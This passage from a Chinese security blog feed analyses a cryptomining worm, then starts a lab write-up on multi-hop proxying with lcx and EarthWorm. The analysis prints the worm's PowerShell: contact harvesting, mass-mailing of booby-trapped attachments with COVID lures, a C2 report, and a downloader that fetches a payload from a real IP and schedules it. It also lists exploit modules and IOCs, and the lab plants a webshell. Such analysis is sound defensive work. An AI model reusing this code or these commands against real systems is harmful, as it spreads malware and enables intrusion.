class="variable">$ol</span>.Session.GetDefaultFolder(<span class="variable">$flag</span>)</span><br><span class="line"><span class="variable">$tcount</span>=<span class="variable">$ol_out</span>.items.count</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="variable">$tcount</span>;(<span class="variable">$i</span> <span class="operator">-gt</span> <span class="number">0</span>) <span class="operator">-and</span> (<span class="variable">$i</span> <span class="operator">-gt</span> (<span class="variable">$tcount</span><span class="literal">-200</span>));<span class="variable">$i</span><span class="literal">--</span>)&#123;</span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$ol_out</span>.items.item(<span class="variable">$i</span>)</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$attach</span> <span class="keyword">in</span> <span class="variable">$item</span>.Attachments)&#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$attach</span>.Filename <span class="operator">-eq</span> <span class="variable">$name</span>))&#123;</span><br><span class="line"><span class="variable">$item</span>.Delete()</span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;Delete mail with attach:&quot;</span>+(<span class="variable">$attach</span>.Filename)+<span class="string">&quot;...&quot;</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add-Zip</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$zipfilename</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="operator">-not</span> (<span class="built_in">test-path</span>(<span class="variable">$zipfilename</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">set-content</span> <span class="variable">$zipfilename</span> (<span class="string">&quot;PK&quot;</span> + [<span class="built_in">char</span>]<span class="number">5</span> + [<span class="built_in">char</span>]<span class="number">6</span> + (<span class="string">&quot;<span class="variable">$</span>([char]0)&quot;</span> * <span class="number">18</span>))</span><br><span class="line">        (<span class="built_in">dir</span> <span class="variable">$zipfilename</span>).IsReadOnly = <span class="variable">$false</span>  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$shellApplication</span> = <span class="built_in">new-object</span> <span class="literal">-com</span> shell.application</span><br><span class="line">    <span class="variable">$zipPackage</span> = <span class="variable">$shellApplication</span>.NameSpace(<span class="variable">$zipfilename</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file</span> <span class="keyword">in</span> <span class="variable">$input</span>) </span><br><span class="line">    &#123; </span><br><span class="line">            <span class="variable">$zipPackage</span>.CopyHere(<span class="variable">$file</span>.FullName)</span><br><span class="line">            <span class="built_in">Start-sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ol</span>=Ne`w<span class="literal">-Obj</span>`ect <span class="literal">-Com</span> outlook.application</span><br><span class="line">get_contacts(<span class="variable">$ol</span>.Session.GetDefaultFolder(<span class="number">10</span>))</span><br><span class="line">get_sent_tos(<span class="variable">$ol</span>.Session.GetDefaultFolder(<span class="number">5</span>))</span><br><span class="line">get_recv_froms(<span class="variable">$ol</span>.Session.GetDefaultFolder(<span class="number">6</span>))</span><br><span class="line"><span class="variable">$muser</span>=<span class="variable">$ol</span>.session.accounts.item(<span class="number">1</span>).smtpaddress</span><br><span class="line"><span class="variable">$att_zip_name</span>=<span class="string">&quot;readme.zip&quot;</span></span><br><span class="line"><span class="variable">$att_zip</span>=<span class="variable">$env:tmp</span>+<span class="string">&quot;\<span class="variable">$att_zip_name</span>&quot;</span></span><br><span class="line"><span class="built_in">dir</span> <span class="variable">$att_js</span>|<span class="built_in">Add-Zip</span> <span class="variable">$att_zip</span></span><br><span class="line"><span class="variable">$att_zip_filesize</span>=[<span class="type">io.file</span>]::readallbytes(<span class="variable">$att_zip</span>).length</span><br><span class="line">(<span class="built_in">New-object</span> net.webclient).downloadstring(<span class="string">&quot;DOWN_URL/report.json?type=mail&amp;u=<span class="variable">$muser</span>&amp;c1=&quot;</span>+<span class="variable">$contacts</span>.count+<span class="string">&quot;&amp;c2=&quot;</span>+<span class="variable">$sent_tos</span>.count+<span class="string">&quot;&amp;c3=&quot;</span>+<span class="variable">$recv_froms</span>.count)</span><br><span class="line"><span class="variable">$ran_index</span>=(<span class="built_in">get-random</span>)%<span class="variable">$mail_pools</span>.length</span><br><span class="line"><span class="variable">$mail_subject</span>=<span class="variable">$mail_pools</span>[<span class="variable">$ran_index</span>][<span class="number">0</span>]</span><br><span class="line"><span class="variable">$mail_body</span>=<span class="variable">$mail_pools</span>[<span class="variable">$ran_index</span>][<span class="number">1</span>]</span><br><span class="line">del_sendmail <span class="variable">$att_zip_name</span> <span class="variable">$att_zip_filesize</span> <span class="number">6</span><span class="string">&#x27;+&#x27;</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$sent_to</span> i<span class="string">&#x27;+&#x27;</span>n <span class="variable">$sent_tos</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$contacts</span> <span class="operator">-notcontains</span> <span class="variable">$sent_to</span>)&#123;</span><br><span class="line"><span class="variable">$contacts</span>+=<span class="variable">$sent_to</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$recv_from</span> <span class="keyword">in</span> <span class="variable">$recv_froms</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$contacts</span> <span class="operator">-notcontains</span> <span class="variable">$recv_from</span>)&#123;</span><br><span class="line"><span class="variable">$contacts</span>+=<span class="variable">$recv_from</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$contact</span> <span class="keyword">in</span> <span class="variable">$contacts</span>)&#123;</span><br><span class="line"><span class="variable">$mail</span>=<span class="variable">$ol</span>.CreateItem(<span class="number">0</span>)  </span><br><span class="line"><span class="variable">$mitem</span>=<span class="variable">$mail</span>.Recipients.Add(<span class="variable">$contact</span>)</span><br><span class="line"><span class="variable">$mail</span>.Su<span class="string">&#x27;+&#x27;</span>bject = <span class="variable">$mail_subject</span> </span><br><span class="line"><span class="variable">$mail</span>.Body = <span class="variable">$mail_body</span></span><br><span class="line"><span class="variable">$mail</span>.Attachments.Add(<span class="variable">$att_doc</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;readme.doc&quot;</span>)</span><br><span class="line"><span class="variable">$mail</span>.Attachments.Add(<span class="variable">$att_zip</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;readme.zip&quot;</span>)</span><br><span class="line"><span class="string">&quot;Sending mail...&quot;</span></span><br><span class="line"><span class="variable">$mail</span>.Send()</span><br><span class="line"><span class="built_in">write-host</span> <span class="string">&quot;Send mail to <span class="variable">$contact</span> succ...&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> ((<span class="built_in">get-random</span>)%<span class="number">5</span>+<span class="number">5</span>)</span><br><span class="line">del_sendmail <span class="variable">$att_zip_name</span> <span class="variable">$att_zip_filesize</span> <span class="number">4</span></span><br><span class="line">del_sendmail <span class="variable">$att_zip_name</span> <span class="variable">$att_zip_filesize</span> <span class="number">5</span></span><br><span class="line">del_sendmail <span class="variable">$att_zip_name</span> <span class="variable">$att_zip_filesize</span> <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">remove-item</span> <span class="variable">$att_doc</span></span><br><span class="line"><span class="built_in">remove-item</span> <span class="variable">$att_js</span></span><br><span class="line"><span class="built_in">remove-item</span> <span class="variable">$att_zip</span></span><br><span class="line"><span class="string">&quot;Done&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&#x27;@.replace(&quot;CORE_URL&quot;,$core_url).replace(&quot;DOWN_URL&quot;,$down_url)</span></span><br><span class="line"><span class="string">if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;))&#123;</span></span><br><span class="line"><span class="string">$sesscmd=&#x27;</span>powershell <span class="literal">-c</span> <span class="variable">$pipe</span>=<span class="built_in">new-object</span> System.IO.Pipes.NamedPipeServerStream(<span class="string">&#x27;&#x27;</span>\\.\pipe\HHyeuqi7<span class="string">&#x27;&#x27;</span>);<span class="variable">$pipe</span>.WaitForConnection();<span class="variable">$sr</span>=<span class="built_in">new-object</span> System.IO.StreamReader(<span class="variable">$pipe</span>);<span class="variable">$cmd</span>=<span class="variable">$sr</span>.ReadToEnd();<span class="variable">$sr</span>.Dispose();<span class="variable">$pipe</span>.Dispose();I`Ex(<span class="variable">$cmd</span>);(<span class="built_in">new-object</span> System.IO.Pipes.NamedPipeServerStream(<span class="string">&#x27;&#x27;</span>\\.\pipe\HHyeuqi7<span class="string">&#x27;&#x27;</span>)).WaitForConnection()<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[Utils.ProcessExtensions]::EnumSessionsAndExecCmd($sesscmd.Trim())</span></span><br><span class="line"><span class="string">$pipe=&#x27;</span>+<span class="string">&#x27;new-object System.IO.Pipes.NamedPipeClientStream(&quot;\\.\pipe\HHyeuqi7&quot;);$pipe.Connect();$sw=new-object System.IO.StreamWriter($pipe);$sw.WriteLine($mail_code);$sw.Dispose();$pipe.Dispose()</span></span><br><span class="line"><span class="string">(new-object System.IO.Pipes.NamedPipeClientStream(&quot;\\.\pipe\HHyeuqi7&quot;)).Connect()</span></span><br><span class="line"><span class="string">&quot;Done and exit...&quot;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">I`Ex $mail_code</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">new-item $env:tmp\godmali4.txt -type file -force</span></span><br></pre></td></tr></table></figure><p>该脚本首先检测了是否存在outlook，如果存在则遍历通讯录并发送带有恶意宏的word文档，同时清除发件箱中的记录。</p><p>发送的主题和正文内容为以下随机一组，均为诱导受害者打开带有恶意宏的Word文档</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主题 The Truth of COVID-19</span><br><span class="line">正文Virus actually comes from United States of America</span><br><span class="line"></span><br><span class="line">主题 COVID-19 nCov Special info WHO</span><br><span class="line">正文very important infomation for Covid-19,see attached document for your action and discretion.</span><br><span class="line"></span><br><span class="line">主题 HALTH ADVISORY:CORONA VIRUS</span><br><span class="line">正文the outbreak of CORONA VIRUS is cause of concern especially where forign personal have recently arrived or will be arriving at various intt in near future.see attached document for your action and discretion.</span><br><span class="line"></span><br><span class="line">主题 WTF</span><br><span class="line">正文what&#x27;s wrong with you?are you out of your mind!!!!!</span><br><span class="line"></span><br><span class="line">主题 What the fcuk</span><br><span class="line">正文are you out of your mind!!!!!what &#x27;s wrong with you?</span><br><span class="line"></span><br><span class="line">主题 good bye</span><br><span class="line">正文good bye, keep in touch</span><br><span class="line"></span><br><span class="line">主题 farewell letter</span><br><span class="line">正文good bye, keep in touch</span><br><span class="line"></span><br><span class="line">主题 broken file</span><br><span class="line">正文 can you help me &#x27;+&#x27;to fix the file,i can&#x27;t read it</span><br><span class="line"></span><br><span class="line">主题This is your order?</span><br><span class="line">正文file is brokened, i can&#x27;t open it</span><br></pre></td></tr></table></figure><h3 id="ode-bin-下载者"><a href="#ode-bin-下载者" class="headerlink" title="ode.bin 下载者"></a>ode.bin 下载者</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>(<span class="built_in">New-Object</span> IO.StreamReader (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.Compression.DeflateStream (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.MemoryStream (,<span class="variable">$</span>(<span class="string">&#x27;edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f225ee76d9a6e7dfcf4e34f3edefdbd8e3ffdf80efd95a61fa5e99df4cea7f7beff2a9b4fbf37faf87aa7fe38cda759f9f2f4d576fad07c7e67e7a1fcf6c9c3dd5df3db81fc4250ec0b7bda6c74e7e1be36dbdd332fdcb32f98f6773efe8d93df3821047eeaeaf7d9bd7e4dff8eee3c78f0fd57c7684e88ee5067f4e3d531fd838ff6efe33bfa83806c9d1290555e8f197bbcf1fd8b176775db50e7dc270339d835bf7dfaa9fce2bdb8df7d911038787545ffba36208176efe0efdd37e0f7f59707a61f1fbcc1425e242078f7537a977e95d70f0c1c1db4f73661f14b409d5f42bf7c42ffff31fd89cff4d71c3f0916fd288bf3d47cba721f5fcb0f7cdc6edbdfe997df27dd9fb799fcaa9facae2fb529fdf5447f4d17797bb6ed5ebbcaed3bbfcf8b1f7338d95f7e097f265df9283fd3dfef1ac0fa93e8dde8af93cb71dbeaef5f2cf5974fbf587eba22241e19e4cc17b945f7c94f5177b6d303308c7e7395d6edddf440ff7a75952f32f33a8df609f59d2eb5470caa8bdbcefdb45ad017f6f3d3375fbd383318722be9736a867037cddb2cafa777d3e66d93b5f369934eef529b347f978f67da6831fd858632f49547c4df38698806fa67dbd2c8bfd03f8806e6e5dc7cffe872697ebfd69f974fd299a5cf6a75bc6d79a22c9e6116a93f7e77fda519d2c1effd22dddf599b76b3623eb91c598ae9cfabfd1dfd6d9d7e92ce0d06d92a5fe8efd9d220e84d8b76f189c182fa31bf128574d6e88fd962eae6285daeeb7183ef1c5a96461e731972792c43bce2f8dda35840aa4b8b97fe64da7429e2fad9a11f6bfaff1dfd9e98a62cf3f9ebb1e97755d453c8f677dd18b6f437d3649afff4e44be68c9fb27370e211e033d377033e4ccd6bf9eb7dfd6d676d29e0b3cb2f36a36acafc97fcd88fb19c31bb1192739e1ecbeff4a99ba1271eb921216e680e274fb92c8cccf397810811d11bfdf3aa9ab9b797c577e92b371bed7965da55f5b4f882be3cb0dc058c97ed5df336ff48217cda60e109a0fef6d50bfde5ec8b74dadc4dbf387df3faf7d18f5e9bd6ebda0e4d09856140edc96724a7a6a941eeadf925339320329c1a4abf332f13a8f1ccb0ff547f1ac1463f321ffac52f36ec43dfb4c5a2ce572cb342202b315be7fa5b8197dd1bfa3b13e617dfb9e3a471273f375ac52008fd37997d6afedac976e53d6e73be73ff60ffc0f472efc18307faeb4387f7a7fbd9bdf3dc715efa8b723500bf4f7ae7ce9d390c999090e182c9f4eb253862abc9dbeb276579ac1fce2cb9f5e7ab478fbe0f991b7f7946aec0fdd9e2626bcb4c9319cc32db66a74009045e3650c2de0c625e8b6d33738488feb6b5755ef87273c7536116aefe02f02aa24b99a49f826275c8f4b523a47f91d599b3a04f7e0fd38107950738ded9bbbb67e66f6fbc7f7f577f1f3f7c387e60a66df7aee1cc470641abe70cee077023acaa218a9ed3df868059457f9490541e0bcf1409e8f88e81b2cc0bfd0d0da7fafb24bf1ab7f9326da766b67e7aa2bf1861dcbeca97a653c7a4a48bf437624f4b5d838ce340cc194d96f9e2636825fbe576db98d1b45bbf2bcd99056efb211505530ac526ea875e26ffc000b45e027dbccc1d7fc0d27f968a4a347d7b16eb89370e7af3ce9d8374b15e98eedf99c933d6d89ad57d6eb62cbeb09f2c0c991c27bf32d2d3e69f6fa5ed725d9d5838ae39da5103ab8af5e7ef4de8185597ded9dbdb35eec1b823b9bf8f9993ef9b9fdfab9dab96cda7df33ed4c179ead2ce85760a27cffd3db442cfdcaf0c14d64d35fac52c7a45e54e5f8adfefdd62894b7e613e7e2594b6dfaec4d2770f52c384d277d6050fc2c751cc71c25f3beb5050df27be39befefdffb5efec597df7ebda2f8e693efefee51abefd1ff4f175f7ebbc167140a8d3fdea2373efe7859543fbdfdfdbdd1eeee885e5a642fc6773efe563dfbe25b1fa7a7cf9f1c9fbdca2eb7dfe4d059bf50a2a7c374fba7bf3c7b41203e3f6db7cfdafc8b74eba3cbe3bac83efae4a3c973fae7f4d1d3ddb7c7f4cba71f51ac33be3c2ebfcabfb7bd3b1e6f6fbddf4be3f2f4c5e76fe677be9ffecc98fadbfa5ef3e6d5d98bcfbfffbb5d9ebe7af26573faf255feecb43e5d9ee477be47e87fff938f7fef8f19b98f3fbef31b27ff0f&#x27;</span><span class="operator">-split</span><span class="string">&#x27;(..)&#x27;</span>|?&#123;<span class="variable">$_</span>&#125;|%&#123;[<span class="type">convert</span>]::ToUInt32(<span class="variable">$_</span>,<span class="number">16</span>)&#125;))), [<span class="type">IO.Compression.CompressionMode</span>]::Decompress)), [<span class="type">Text.Encoding</span>]::ASCII)).ReadToEnd();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单解密去混淆后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &amp; ((geT-vaRIABLE &#x27;*Mdr*&#x27;).Name[3,11,2]-join&#x27;&#x27;)(((&#x27;. ( $psHOmE[21]+$pSHOMe[34]+&#x27;X&#x27;)((&#x27;$path4 = &quot;$env:temp6nMkk4kk.log&#x27;</span><br><span class="line">$pname = -join ([char[]](97..122) NX8 Get-Random -Count (Get-Random -Minimum 4 -Maximum 8))</span><br><span class="line">$pnamepath = &quot;$env:tmp6nM$pname.exe&quot;</span><br><span class="line">if(!(test-path $path4))&#123;</span><br><span class="line">(new-object net.webclient).downloadfile(&#x27;http://167.99.154.202/20.dat?$params&#x27;,$pnamepath)</span><br><span class="line">if((test-path $pnamepath) -and ((gmd5 ([IO.File]::ReadAllBytes($pnamepath))) -eq u04ef3a4697773f84850fe1a086db8edfe0u04))&#123;</span><br><span class="line">if($permit)&#123;</span><br><span class="line">&amp;cmd.exe /c schtasks /create /ru SYSTEM /sc MINUTE /mo 50 /tn &#x27;\Microsoft\Windows\$pname&quot; /tr &#x27;$pnamepath&quot; /F</span><br><span class="line">&#125;else&#123;</span><br><span class="line">u04Set ws = CreateObject(&#x27;Wscript.Shell&quot;)u04 | Out-File $env:temp6nM\tt.vbs</span><br><span class="line">&#x27;ws.run &#x27;cmd /c &#x27; + $pnamepath + u04&#x27;,vbhide&#x27; | Out-File -Append $env:temp6nM\tt.vbs</span><br><span class="line">&amp;cmd.exe /c schtasks /create /sc MINUTE /mo 50 /tn &quot;$pname&#x27; /tr &#x27;$env:temp\6nMtt.vbs&quot; /F</span><br><span class="line">&#125;</span><br><span class="line">New-Item $path4 -type file</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#x27;).replacE(|,|).replacE(&#x27;,&#x27;).replacE(&#x27;&quot;&#x27;,&quot;).replacE($,[strINg]$).replacE(\,&#x27;\&#x27;) )</span><br><span class="line">&#x27;)-REPlace \,\ -REPlace  &#x27;,&#x27; -REPlace &#x27;$&#x27;,$) )  </span><br></pre></td></tr></table></figure><p>主要功能从<code>167.99.154.202</code>下载<code>20.dat</code>并设置为计划任务，下载的文件是一个pyinstaller打包的可执行文件</p><p><img src="/images/image-20210102194031289.png" alt="image-20210102194031289"></p><h3 id="if-bin-横向核心文件"><a href="#if-bin-横向核心文件" class="headerlink" title="if.bin 横向核心文件"></a>if.bin 横向核心文件</h3><p>脚本解密后为1W+行的powershell文件，粘贴后篇幅过长，故文章截取主要功能进行说明</p><p><img src="/images/image-20210104105657457.png" alt="image-20210104105657457"></p><p>在后续横向扩散过程中标识受害机存在的漏洞并从<code>http://t.amynx.com</code>下载以下存在对应漏洞的文件：<code>7p.php</code>、<code>ipc.jsp</code>、<code>ipco.jsp</code>、<code>ms.jsp</code>、<code>mso.jsp</code>、<code>rdp.jsp</code>、<code>rdpo.jsp</code>、<code>core.png</code>（通过参数<code>rds</code>、<code>rdso</code>、<code>ssh</code>、<code>ssho</code>判断主机存在的漏洞）、<code>smgh.jsp</code>、<code>smgho.jsp</code>、<code>logic.jsp</code>、<code>logico.jsp</code></p><p>依次尝试<code>ipconfig /all</code>、<code>ipconfig /displaydns</code>、<code>netstat -ano</code>获取本机内网地址，并访问<code>https://api.ipify.org/</code>获取本机外网IP</p><p><img src="/images/image-20210104105717805.png" alt="image-20210104105717805"></p><p>脚本内置C类网段：</p><ul><li>192.168.0</li><li>192.168.1</li><li>192.168.2</li><li>192.168.3</li><li>192.168.4</li><li>192.168.5</li><li>192.168.6</li><li>192.168.7</li><li>192.168.8</li><li>192.168.9</li><li>192.168.10</li><li>192.168.18</li><li>192.168.31</li><li>192.168.199</li><li>192.168.254</li><li>192.168.67</li><li>10.0.0</li><li>10.0.1</li><li>10.0.2</li><li>10.1.1</li><li>10.90.90</li><li>10.1.10</li><li>10.10.1</li><li>172.16.1</li><li>172.16.2</li><li>172.16.3</li></ul><p>内置模块如下</p><ul><li><p><code>MS17-010</code>扫描+利用模块</p></li><li><p><code>SMB1/2</code>匿名登录扫描+利用模块</p></li><li><p><code>IPC</code>空连接利用模块，用于将批处理文件复制到远程机启动目录下<img src="/images/image-20210104110754102.png" alt="image-20210104110754102"></p></li><li><p><code>Hadoop yarn</code> 框架RCE模块</p></li><li><p><code>weblogic CVE-2020-14882/14883</code> RCE模块</p></li><li><p><code>mssql xp_cmdshell</code>命令执行模块</p><p><img src="/images/image-20210104110959288.png" alt="image-20210104110959288"></p></li><li><p>SMB暴力破解模块</p></li><li><p>内网扫描模块</p></li><li><p>USB快捷方式漏洞利用模块</p></li><li><p>利用<code>powerdump</code>转储本机Hash模块</p></li><li><p><code>SMB-Ghost</code>漏洞利用模块</p></li><li><p>SSH爆破模块</p></li><li><p>探测是否为公网IP模块</p></li><li><p>redis命令执行模块</p></li><li><p>RDP暴力破解模块</p></li><li><p>预置字典，用于组NTLM  hash、爆破模块</p><p><img src="/images/image-20210104111245817.png" alt="image-20210104111245817"></p></li><li><p>扫描信息回报模块，将扫描的信息回报到<code>http://d.ackng.com/log.json</code></p><p><img src="/images/image-20210104112242528.png" alt="image-20210104112242528"></p></li></ul><h3 id="kr-bin-挖矿核心"><a href="#kr-bin-挖矿核心" class="headerlink" title="kr.bin 挖矿核心"></a>kr.bin 挖矿核心</h3><p>脚本功能如下：</p><ul><li><p>判断本机是否为公网IP</p></li><li><p>检查当前用户是否有<code>SeDebugPrivilege</code>权限</p></li><li><p>矿池通讯</p></li><li><p>循环干掉竞争对手进程</p><p><img src="/images/image-20210104115317391.png" alt="image-20210104115317391"></p></li><li><p>循环干掉竞争对手服务</p><p><img src="/images/image-20210104115329522.png" alt="image-20210104115329522"></p><p><img src="/images/image-20210104115403499.png" alt="image-20210104115403499"></p></li></ul><h1 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><ul><li>128.199.183.160</li><li>45.61.139.154</li><li>161.35.107.193</li><li>66.42.43.37</li><li>167.99.154.202</li><li>139.162.80.221</li><li>128.199.183.160</li><li>128.199.188.255</li><li>167.71.158.207</li></ul><h2 id="Domains"><a href="#Domains" class="headerlink" title="Domains"></a>Domains</h2><ul><li>http[:]&#x2F;&#x2F;d.ackng.com</li><li>http[:]&#x2F;&#x2F;t.amynx.com</li><li>http[:]&#x2F;&#x2F;t.zer9g.com</li><li>http[:]&#x2F;&#x2F;t.zz3r0.com</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多级代理实验</title>
      <link href="/p/3be9.html"/>
      <url>/p/3be9.html</url>
      
        <content type="html"><![CDATA[<p> 内网渗透中经常碰到多个网段的机器不出网的情况，做一套试验环境来练习下多级代理</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>以下环境均在VM16中搭建</p><blockquote><ul><li>LEDE x2.36 软路由 *1 <ul><li>网络：可出网，边界，IP 172.16.17.100</li><li>虚拟机配置：2C 4G 4网卡</li></ul></li><li>Windows server 2019 *1 <ul><li>网络：可出网，DMZ，WEB机，IP 172.16.18.2</li><li>虚拟机配置：2C 2G 1网卡</li></ul></li><li>Windows server 2016 *1<ul><li>网络：不可出网，DMZ，IP 10.100.100.2</li><li>虚拟机配置：2C 2G 1网卡</li></ul></li><li>Windows server 2008 R2*1<ul><li>网络：不可出网，DMZ，IP 192.168.37.1</li><li>虚拟机配置：2C 2G 1网卡</li></ul></li><li>Win10 *1<ul><li>网络：通Win2019</li><li>虚机配置：4C8G 1网卡</li></ul></li></ul></blockquote><p>拓扑图</p><p><img src="/images/image-20201214144901117.png" alt="image-20201214144901117"></p><h1 id="攻击机配置"><a href="#攻击机配置" class="headerlink" title="攻击机配置"></a>攻击机配置</h1><blockquote><p>Win10</p><p>kali (parrot亦可)</p></blockquote><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="LEDE配置"><a href="#LEDE配置" class="headerlink" title="LEDE配置"></a>LEDE配置</h2><p>安装好LEDE后配置接口如下</p><p><img src="/images/image-20201214150043402.png" alt="image-20201214150043402"></p><p>配置后状态如图</p><p><img src="/images/image-20201214161823622.png" alt="image-20201214161823622"></p><p>防火墙配置如下</p><p><img src="/images/image-20201214150648473.png" alt="image-20201214150648473"></p><p>DMZ规则</p><p><img src="/images/image-20201214150701772.png" alt="image-20201214150701772"></p><p>DMZ_WAN规则</p><p><img src="/images/image-20201214150740971.png" alt="image-20201214150740971"></p><h3 id="端口转发规则"><a href="#端口转发规则" class="headerlink" title="端口转发规则"></a>端口转发规则</h3><p><code>LEDE</code>防火墙新建端口转发规则</p><p><img src="/images/image-20201214155331108.png" alt="image-20201214155331108"></p><h2 id="测试连通性"><a href="#测试连通性" class="headerlink" title="测试连通性"></a>测试连通性</h2><p>3台虚拟机安装好后测试连通性</p><p> <strong>2016虚机</strong></p><p><img src="/images/image-20201214151409744.png" alt="image-20201214151409744"></p><p><strong>2008</strong><img src="/images/image-20201214151423369.png" alt="image-20201214151423369"></p><p><strong>2019</strong><img src="/images/image-20201214151433126.png" alt="image-20201214151433126"></p><p>2019安装<code>phpstudy</code>，写个一句话马</p><p><img src="/images/image-20201214155234667.png" alt="image-20201214155234667"></p><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>攻击机网卡设置为与<code>LEDE</code>一样的网卡，更改网关为LEDE后测试正常访问</p><p><img src="/images/image-20201214155222797.png" alt="image-20201214155222797"></p><p>测试一句话连接</p><p><img src="/images/image-20201214155534350.png" alt="image-20201214155534350"></p><h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><h3 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h3><h4 id="简单的转发"><a href="#简单的转发" class="headerlink" title="简单的转发"></a>简单的转发</h4><p>在目标机上执行<code>lcx -slav 172.16.17.3 5555 127.0.0.1 3389</code>即可将本地<code>3389</code>转发到攻击机的<code>5555</code>端口</p><p>攻击机本地执行<code>lcx -listenning 5555 5556</code>即可通过本地127.0.0.1:5556连接<code>172.16.18.2</code>的3389</p><p>流量走向<code>172.16.18.2:3389→172.16.17.3:5555</code></p><p><img src="/images/image-20201214191018191.png" alt="image-20201214191018191"></p><h4 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h4><p>2016机器执行<code>Lcx.exe -slav 172.16.18.2 5559 127.0.0.1 3389</code></p><p>2019机器执行<code>lcx -trans 5559 172.16.17.3 5558</code></p><p>攻击机执行<code>lcx -listenning 5558 5556</code></p><p>此时的被控机流量走向<code>10.100.100.2:3389→172.16.18.2:5559→172.16.17.3:5558</code></p><p><img src="/images/image-20201214195502955.png" alt="image-20201214195502955"></p><h4 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h4><p>2008机器执行<code>Lcx.exe -slav 10.100.100.2 5560 127.0.0.1 3389</code></p><p>2016机器执行<code>lcx -trans 5560 172.16.18.2 5559</code></p><p>2019机器执行<code>lcx -trans 5559 172.16.17.3 5558</code></p><p>攻击机执行<code>lcx -listenning 5558 5556</code></p><p>此时的被控机流量走向<code>192.168.37.2:3389→10.100.100.2:5560→172.16.18.2:5559→172.16.17.3:5558</code></p><p>卡黑屏，无法正常操作</p><p><img src="/images/image-20201215092212918.png" alt="image-20201215092212918"></p><h3 id="Go版LCX"><a href="#Go版LCX" class="headerlink" title="Go版LCX"></a>Go版LCX</h3><p>项目地址<code>https://github.com/cw1997/NATBypass</code></p><p>2008机器执行<code>Lcx.exe -slave 127.0.0.1:3389 10.100.100.2:5560 </code></p><p>2016机器执行<code>lcx -tran 5560 172.16.18.2:5559</code></p><p>2019机器执行<code>lcx -tran 5559 172.16.17.3:5558</code></p><p>攻击机执行<code>lcx -listen 5558 5556</code></p><p>此时的被控机流量走向<code>192.168.37.2:3389→10.100.100.2:5560→172.16.18.2:5559→172.16.17.3:5558</code></p><p>可以正常操作</p><p><img src="/images/image-20201215095227093.png" alt="image-20201215095227093"></p><h3 id="earthworm"><a href="#earthworm" class="headerlink" title="earthworm"></a>earthworm</h3><h4 id="简单的转发-1"><a href="#简单的转发-1" class="headerlink" title="简单的转发"></a>简单的转发</h4><blockquote><p><code>earthworm</code>提供了6种命令格式</p><p><code>ssocksd</code> 正向服务器，等待客户端连接</p><p><code>rcsocks</code> 反弹客户端</p><p><code>rssocks</code> 反弹服务端</p><p><code>lcx_slave</code> 反弹服务端</p><p><code>lcx_listen</code> 监听<code>lcx_slave</code>传递的数据</p><p><code>lcx_tran</code> 转发用</p></blockquote><h5 id="lcx管道"><a href="#lcx管道" class="headerlink" 